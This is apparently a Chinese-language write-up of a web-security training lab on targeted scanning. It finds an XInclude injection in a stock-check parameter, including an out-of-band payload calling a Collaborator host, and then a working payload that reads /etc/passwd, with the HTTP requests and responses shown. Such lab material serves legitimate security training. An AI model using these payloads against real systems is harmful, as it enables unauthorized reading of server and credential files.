# 实验室：通过定向扫描快速发现漏洞

本实验室存在一个可让你从服务器读取任意文件的漏洞。要解决本实验，请在 10 分钟内检索 `/etc/passwd` 文件的内容。

由于时间限制较紧，建议使用 Burp Scanner 辅助。你可以扫描整个网站来识别漏洞，但这可能留下不足的时间来解决实验。相反，请凭借直觉识别可能易受攻击的端点，然后尝试对特定请求运行[定向扫描](/web-security/essential-skills/using-burp-scanner-during-manual-testing#scanning-a-specific-request)。一旦 Burp Scanner 识别出攻击向量，你就可以利用自己的专业知识找到利用它的方法。

> **提示**
> 如果卡住了，请查阅我们 Academy 中关于该漏洞类别的相关主题。

## 步骤

侦察
- 访问商品详情页，使用库存检索功能
    ```http
    POST /product/stock HTTP/2
    Host: id.web-security-academy.net

    productId=1&storeId=1
    ```

    - 响应
        ```http
        HTTP/2 200 OK
        Content-Type: text/plain; charset=utf-8
        X-Frame-Options: SAMEORIGIN
        Content-Length: 3

        516
        ```


探测库存检索功能
- 载荷
    `productId=1'&storeId=1`

- 响应
    `"Invalid product ID: 1'"`

- 似乎并非 SQLi，存在错误回显

对库存检索请求执行主动扫描
- 扫描事件日志发现 XML 注入
    ```log
    Issue detail
    The productId parameter appears to be vulnerable to XML injection. The payload <oci xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://id.oastify.com/foo"/></oci> was sent to the server. This payload contains some XML that references a URL on an external domain. The application interacted with that domain, indicating that the parser processed the injected XML.
    ```

    - 请求与载荷
        ```http
        POST /product/stock HTTP/2
        Host: id.web-security-academy.net

        productId=%3coci%20xmlns%3axi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXInclude%22%3e%3cxi%3ainclude%20href%3d%22http%3a%2f%2fid.oastify.com%2ffoo%22%2f%3e%3c%2foci%3e&storeId=1
        ```

        ```xml
        <oci xmlns:xi="http://www.w3.org/2001/XInclude">
            <xi:include href="http://id.oastify.com/foo"/>
        </oci>
        ```
        - 使用 XMLi 的 XInclude 带外载荷
        
    - 响应
        ```http
        HTTP/2 400 Bad Request
        Content-Type: application/json; charset=utf-8
        X-Frame-Options: SAMEORIGIN
        Content-Length: 57

        "Invalid product ID: zy7mywb5qee63nb42p0wm9zjmgjgtgkfigz"
        ```
        - 反射协作服务器的响应

根据 XMLi 注入主题的 XInclude 小节构建本地文件读取载荷
- 载荷
    ```xml
    <oci xmlns:xi="http://www.w3.org/2001/XInclude">
        <xi:include parse="text" href="file:///etc/passwd" />
    </oci>
    ```
    - 成功包含本地文件
